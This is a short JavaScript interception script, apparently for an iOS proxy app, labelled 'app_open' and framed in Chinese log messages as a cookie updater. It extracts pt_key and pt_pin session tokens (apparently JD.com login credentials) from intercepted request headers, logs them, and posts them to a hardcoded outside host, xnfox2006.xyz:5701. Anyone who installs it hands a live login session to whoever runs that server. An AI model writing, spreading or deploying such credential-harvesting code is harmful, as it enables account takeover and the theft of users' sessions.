const $ = new Env("app_open")

if ($request.headers) {
    let cookie = ($request.headers.Cookie || $request.headers['Cookie'] || $request.headers['cookie'] || '')
    let pt_key = cookie.match(/(pt_key=[^;]*)/)[1]
    let pt_pin = cookie.match(/(pt_pin=[^;]*)/)[1]
    if (pt_key && pt_pin) {
        console.log('================')
        console.log(`${pt_key};${pt_pin};`)
        console.log('================')

        const options = {
            "url": "xnfox2006.xyz:5701",
            'body': JSON.stringify({
                "pt_key": pt_key,
                "pt_pin": pt_pin
            })
        }
        $.post(options, (err, resp, data) => {
            try {
                if (err) {
                    $.msg("app_open获取成功！", `更新cookie失败: ${JSON.stringify(err)}`)
                    console.log(`pp_open获取成功,更新cookie失败: ${JSON.stringify(err)}`)
                } else {
                    console.log(`更新cookie: ${data}`)
                }
            } catch (e) {
                $.logErr(e, resp)
            }
        })
    }
}

$.done($request.headers)
